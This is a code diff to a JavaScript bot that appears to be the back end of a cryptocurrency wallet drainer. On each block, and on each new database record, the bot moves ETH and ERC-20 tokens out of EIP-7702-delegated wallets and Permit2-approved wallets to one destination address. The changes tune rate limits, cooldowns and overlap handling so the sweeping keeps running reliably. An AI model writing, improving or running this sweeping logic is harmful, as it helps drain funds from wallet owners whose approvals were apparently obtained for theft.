@@ -6,7 +6,7 @@
 //   rpcProvider — JsonRpcProvider for ALL balance/fee/tx calls (RPC_URL)
 //
 // Sweep strategy:
-//   Block events      → sweep wallets whose 30s cooldown has expired
+//   Block events      → sweep wallets whose 60s cooldown has expired (sequential, 1 wallet/s)
 //   Realtime INSERT/UPDATE → sweep immediately, bypass cooldown
 
 require("dotenv").config();
@@ -32,7 +32,7 @@ const PERMIT2_ADDRESS   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI       = ethers.parseEther("0.001");
 const MIN_TOKEN_UNITS   = "0.5";
 const SWEEP_COOLDOWN_MS = 60_000; // 60s per-wallet cooldown — BNB QuickNode 50/s limit
-const TOKEN_CALL_DELAY  = 200;    // ms between token balance checks — rate-limit protection
+const TOKEN_CALL_DELAY  = 150;    // ms after each token call (applied even on skip/failure)
 
 // ── Validation ────────────────────────────────────────────────────────────────
 
@@ -102,6 +102,7 @@ const lastSwept        = new Map(); // address → timestamp of last sweep
 let realtimeChannel    = null;
 const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
 let reconnectAttempt   = 0;
+let isProcessing       = false; // block-overlap guard — skip block if previous still running
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -121,7 +122,7 @@ async function getFeeData() {
   return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
 }
 
-// 30s cooldown — Realtime events bypass this entirely
+// 60s cooldown — Realtime events bypass this entirely
 function shouldSweep(address) {
   const last = lastSwept.get(address.toLowerCase());
   if (!last) return true;
@@ -212,26 +213,28 @@ async function sweepDelegatedWallet(walletAddress) {
       }
     } catch (e) { err(`[eip7702] sweepETH ${checksum}: ${e.message}`); }
 
-    // ERC-20 tokens — small delay between checks to avoid rate limits
+    // ERC-20 tokens — sequential with 150ms after each call to avoid rate limits
     for (const tokenAddress of TOKENS_TO_WATCH) {
       try {
-        await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
         const token   = new ethers.Contract(tokenAddress.trim(), ERC20_ABI, rpcProvider);
         const balance = await token.balanceOf(checksum);
         let decimals  = 18;
         try { decimals = await token.decimals(); } catch {}
-        if (balance < ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) continue;
-        let symbol = tokenAddress.slice(0, 8);
-        try { symbol = await token.symbol(); } catch {}
-        log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
-        const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
-        const fee = await getFeeData();
-        const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
-          gasLimit: gas * 120n / 100n, ...fee,
-        });
-        log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
-        await tx.wait();
+        if (balance >= ethers.parseUnits(MIN_TOKEN_UNITS, decimals)) {
+          let symbol = tokenAddress.slice(0, 8);
+          try { symbol = await token.symbol(); } catch {}
+          log(`[eip7702] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — sweeping`);
+          const gas = await userContract.sweepTokens.estimateGas(tokenAddress.trim(), DESTINATION_ADDRESS);
+          const fee = await getFeeData();
+          const tx  = await userContract.sweepTokens(tokenAddress.trim(), DESTINATION_ADDRESS, {
+            gasLimit: gas * 120n / 100n, ...fee,
+          });
+          log(`[eip7702] sweepTokens(${symbol}) tx: ${tx.hash}`);
+          await tx.wait();
+        }
       } catch (e) { err(`[eip7702] sweepToken ${tokenAddress} from ${checksum}: ${e.message}`); }
+      // 150ms after every token (including skips/failures) — prevents burst calls
+      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
     }
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
 }
@@ -292,35 +295,39 @@ async function sweepPermit2Wallet(walletAddress) {
 
   for (const entry of tokens) {
     const tokenAddress = normalizeAddress(typeof entry === "string" ? entry : entry.token || entry.tokenAddress);
-    if (!tokenAddress) continue;
+    if (!tokenAddress) {
+      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
+      continue;
+    }
 
     try {
-      await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
       const token   = new ethers.Contract(tokenAddress, ERC20_ABI, rpcProvider);
       const balance = await token.balanceOf(checksum);
       let decimals  = 18;
       try { decimals = await token.decimals(); } catch {}
       const minWei  = ethers.parseUnits(MIN_TOKEN_UNITS, decimals);
-      if (balance < minWei) continue;
+      if (balance >= minWei) {
+        let symbol = tokenAddress.slice(0, 8);
+        try { symbol = await token.symbol(); } catch {}
+        log(`[permit2] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — transferFrom`);
 
-      let symbol = tokenAddress.slice(0, 8);
-      try { symbol = await token.symbol(); } catch {}
-      log(`[permit2] ${checksum} ${symbol} ${ethers.formatUnits(balance, decimals)} — transferFrom`);
+        const MAX_UINT160 = (1n << 160n) - 1n;
+        const amount = balance > MAX_UINT160 ? MAX_UINT160 : balance;
 
-      const MAX_UINT160 = (1n << 160n) - 1n;
-      const amount = balance > MAX_UINT160 ? MAX_UINT160 : balance;
-
-      const fee = await getFeeData();
-      const tx = await permit2.transferFrom(
-        checksum, DESTINATION_ADDRESS, amount, tokenAddress,
-        { gasLimit: 150_000n, ...fee }
-      );
-      log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
-      await tx.wait();
-      log(`[permit2] transferFrom(${symbol}) confirmed`);
+        const fee = await getFeeData();
+        const tx = await permit2.transferFrom(
+          checksum, DESTINATION_ADDRESS, amount, tokenAddress,
+          { gasLimit: 150_000n, ...fee }
+        );
+        log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
+        await tx.wait();
+        log(`[permit2] transferFrom(${symbol}) confirmed`);
+      }
     } catch (e) {
       err(`[permit2] transferFrom ${tokenAddress} from ${checksum}: ${e.message}`);
     }
+    // 150ms after every token (including skips/failures) — prevents burst calls
+    await new Promise((r) => setTimeout(r, TOKEN_CALL_DELAY));
   }
 }
 
@@ -344,7 +351,7 @@ async function loadDelegatedWallets() {
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
-// ── Supabase Realtime — instant sweep, bypasses 30s cooldown ─────────────────
+// ── Supabase Realtime — instant sweep, bypasses 60s cooldown ─────────────────
 
 function subscribeRealtime() {
   if (!supabase) { warn("Supabase not configured — Realtime skipped"); return; }
@@ -429,33 +436,44 @@ async function startBot() {
     wsProvider.on("block", async (blockNumber) => {
       reconnectAttempt = 0; // reset backoff on successful block
 
-      // Main-contract sweep (no cooldown — these are cheap checks)
-      if (contract) {
-        await sweepETH();
-        for (const tokenAddress of TOKENS_TO_WATCH) {
-          await sweepToken(tokenAddress.trim());
-        }
+      // Skip this block entirely if the previous sweep cycle hasn't finished
+      if (isProcessing) {
+        log(`Block ${blockNumber} — previous sweep still running, skipping`);
+        return;
       }
+      isProcessing = true;
 
-      // Only sweep wallets whose 60s cooldown has expired
-      const due = [...delegatedWallets.keys()].filter(shouldSweep);
-      if (due.length === 0) return;
-      log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);
-
-      for (const walletAddress of due) {
-        const walletType = delegatedWallets.get(walletAddress);
-        try {
-          if (walletType === "permit2") {
-            await sweepPermit2Wallet(walletAddress);
-          } else {
-            await sweepDelegatedWallet(walletAddress);
+      try {
+        // Main-contract sweep (no cooldown — these are cheap checks)
+        if (contract) {
+          await sweepETH();
+          for (const tokenAddress of TOKENS_TO_WATCH) {
+            await sweepToken(tokenAddress.trim());
           }
-          markSwept(walletAddress);
-        } catch (e) {
-          err(`sweep failed for ${walletAddress}: ${e.message}`);
         }
-        // 500ms between wallets to stay under QuickNode 50 req/s limit
-        await new Promise((r) => setTimeout(r, 500));
+
+        // Only sweep wallets whose 60s cooldown has expired
+        const due = [...delegatedWallets.keys()].filter(shouldSweep);
+        if (due.length === 0) return;
+        log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due`);
+
+        for (const walletAddress of due) {
+          const walletType = delegatedWallets.get(walletAddress);
+          try {
+            if (walletType === "permit2") {
+              await sweepPermit2Wallet(walletAddress);
+            } else {
+              await sweepDelegatedWallet(walletAddress);
+            }
+            markSwept(walletAddress);
+          } catch (e) {
+            err(`sweep failed for ${walletAddress}: ${e.message}`);
+          }
+          // 1s between wallets — keeps calls well under QuickNode 50 req/s limit
+          await new Promise((r) => setTimeout(r, 1000));
+        }
+      } finally {
+        isProcessing = false;
       }
     });
 
